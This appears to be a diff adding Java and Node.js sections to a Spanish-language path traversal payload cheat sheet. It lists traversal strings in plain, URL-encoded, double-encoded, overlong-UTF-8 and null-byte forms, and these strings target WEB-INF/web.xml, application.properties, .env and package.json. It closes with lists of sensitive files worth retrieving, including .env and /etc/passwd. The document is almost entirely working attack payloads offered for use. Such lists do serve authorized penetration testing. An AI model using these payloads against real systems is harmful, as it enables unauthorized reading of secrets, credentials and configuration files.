@@ -63,3 +63,90 @@
 ```
 ..\..\..\..\..\..\..\windows\win.ini
 ```
+
+------------------------------------------------------------------------------
+
+## Java
+
+```
+../../../../WEB-INF/web.xml
+```
+
+```
+..\..\..\..\WEB-INF\web.xml
+```
+
+```
+..%2f..%2f..%2f..%2fWEB-INF/web.xml
+```
+
+```
+..%2f..%2f..%2f..%2fWEB-INF/classes/application.properties
+```
+
+```
+..%c0%af..%c0%af..%c0%af..%c0%afWEB-INF/web.xml
+```
+
+```
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/WEB-INF/web.xml
+```
+
+```
+..%252f..%252f..%252f..%252fWEB-INF/web.xml
+```
+
+```
+%252e%252e%252f%25252e%252e%252fWEB-INF/web.xml
+```
+
+> Archivos clave en Java para buscar:
+
+>  /WEB-INF/web.xml
+
+> /WEB-INF/classes/application.properties
+
+> /WEB-INF/classes/application.yml
+
+> /META-INF/MANIFEST.MF
+--------------------------------------------------------------------------------------
+
+## JavaScript
+
+```
+../../../../package.json
+```
+
+```
+../../../../.env
+```
+
+```
+../../../../server.js
+```
+
+```
+....//....//....//....//package.json
+```
+
+```
+..././..././..././package.json
+```
+
+```
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage.json
+```
+
+```
+..%2f..%2f..%2f..%2f.env
+```
+
+```
+../../../../package.json%00
+```
+
+> Archivos clave en Node.js para buscar:
+> package.json
+> .env
+> app.js / server.js
+> /etc/passwd (si está corriendo en contenedor Linux)
